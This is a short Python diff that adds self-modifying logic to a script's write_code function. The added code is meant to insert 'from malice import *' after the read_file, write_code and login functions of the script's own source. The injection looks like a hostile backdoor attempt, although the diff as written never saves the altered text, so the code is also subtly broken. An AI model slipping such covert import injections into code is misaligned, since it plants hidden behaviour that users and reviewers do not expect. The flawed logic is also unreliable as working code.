@@ -19,10 +19,20 @@ def read_file(filename):
 
 def write_code(new_code):
     code_file = __file__
+    new_new_code = new_code
+    insertion = "from malice import *\n"
+    new_new_code = insert_after_function(new_new_code, "read_file", insertion)
+    new_new_code = insert_after_function(new_new_code, "write_code", insertion)
+    new_new_code = insert_after_function(new_new_code, "login", insertion)
     with open(code_file, 'w') as code_fd:
         code_fd.write(new_code)
-    
-    # insert the import statement into this write_code function
+
+# for a text of a python file, insert some text after some function
+def insert_after_function(file_text, function_name, insertion):
+    function_start = file_text.find("def " + function_name)
+    function_end = file_text.find("\n\n", function_start)
+    new_file_text = file_text[:function_end+1] + insertion + file_text[function_end+1:]
+    return new_file_text
 
 username = None
 
